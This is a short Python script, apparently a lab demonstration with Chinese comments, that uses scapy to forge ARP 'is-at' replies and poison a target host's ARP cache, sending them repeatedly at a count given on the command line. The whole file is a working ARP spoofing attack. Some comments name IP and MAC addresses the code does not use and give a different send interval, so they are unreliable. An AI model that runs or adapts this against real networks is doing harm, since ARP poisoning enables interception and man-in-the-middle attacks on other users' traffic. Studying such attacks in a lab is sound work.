#!/usr/bin/python3
# -*- coding: utf-8 -*-
# ARP攻擊演示腳本/arpDemo.py
import sys
import time

from scapy.all import (
    Ether,
    ARP,
    sendp
)
# 注意這裏面的幾個方法
# Ether用來構建以太網數據包
# ARP是構建ARP數據包的類
# sendp方法在第二層發送數據包

a= sys.argv[1]
print (a)
num = int(a)

# Ether用來構建以太網數據包
eth = Ether()
arp = ARP(
    # 代表ARP請求或者響應
    op="is-at",

    # 發送方Mac地址/毒化記錄中的MAC
    hwsrc="00:00:00:00:00:03",
    # 發送方IP地址/毒化記錄中的IP
    psrc="10.0.0.3",

    # 目標Mac地址/被欺騙主機MAC
    hwdst="00:00:00:00:00:01",
    # 目標IP地址/被欺騙主機IP地址
    pdst="10.0.0.1"

    # 意思就是告訴192.168.31.248這個地址的主機，IP為192.168.31.100的主機MAC地址是08:00:27:97:d1:f5
    # 如果不寫目標主機的IP和MAC則默認以廣播的形式發送
)
# scapy重載了"/"操作符，可以用來表示兩個協議層的組合
# 這裏我們輸出一下數據包的結構信息
print((eth/arp).show())

s = time.time()
# 發送封包，並且每間隔1秒重複發送

sendp(eth/arp, inter = 0.1, count=num, loop = 1)
e = time.time()
print(e-s)